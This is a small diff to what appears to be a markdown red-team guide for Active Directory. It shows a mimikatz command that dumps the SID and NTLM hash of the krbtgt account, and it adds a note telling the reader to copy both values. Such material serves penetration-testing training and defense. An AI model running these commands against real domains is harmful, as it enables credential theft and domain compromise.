@@ -26,11 +26,17 @@ mimikatz # token::elevate
 ```
 
 
-### Dumping the SID and NTLM hash
+### **Dumping the SID and NTLM hash**
 
 ```powershell
 # Dump the sid and NTLM hash of the krbtgt user
 mimikatz # lsadump::lsa /inject /name:krbtgt
 ```
 
+
+#### **Example**
+
+![](https://i.imgur.com/4XcWt6w.png)
+
+**Note :** Copy both the SID and NTLM hash to your note pad on your DC
 
